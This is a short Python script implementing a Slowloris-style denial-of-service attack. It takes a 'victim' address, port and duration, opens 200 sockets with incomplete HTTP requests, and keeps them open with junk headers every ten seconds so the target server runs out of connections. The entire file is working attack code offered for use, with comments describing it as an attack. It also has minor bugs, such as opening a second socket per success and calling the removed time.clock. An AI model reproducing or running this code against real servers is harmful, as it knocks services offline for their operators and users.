
import time
import socket
import random
import sys

header = ["Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"]

def create_socket(ip, port):
    
    try:
    
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip,port))

        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        sock.send("User-Agent: {}\r\n".format(header).encode("utf-8"))
        sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    
    except socket.error:
        return None
    
    return sock

if __name__ == "__main__":
    victim  = sys.argv[1]
    port = int(sys.argv[2])
    duration  = int(sys.argv[3])
    socket_num = 200
    
    sock_list = []
    
    #Create sockets
    for i in range(socket_num):
        s = create_socket(victim,port)
        if s:
            sock_list.append(create_socket(victim,port))
        else:
            break
            
    end_time = time.clock()+duration
        
    #Persist attack for duration of time
    while (time.clock() < end_time):
        
        #Keep sockets alive
        for sock in sock_list:
            try:
                sock.send("X-byebye: {}\r\n".format(random.randint(1,2000)).encode("utf-8"))
            except socket.error:
                sock_list.remove(sock)
        
        #Recreate dead sockets
        for i in range(socket_num - len(sock_list)):
            s = create_socket(victim,port)
                
            if s:
                sock_list.append(create_socket(victim,port))
            else:
                break
       
        #Wait
        time.sleep(10)
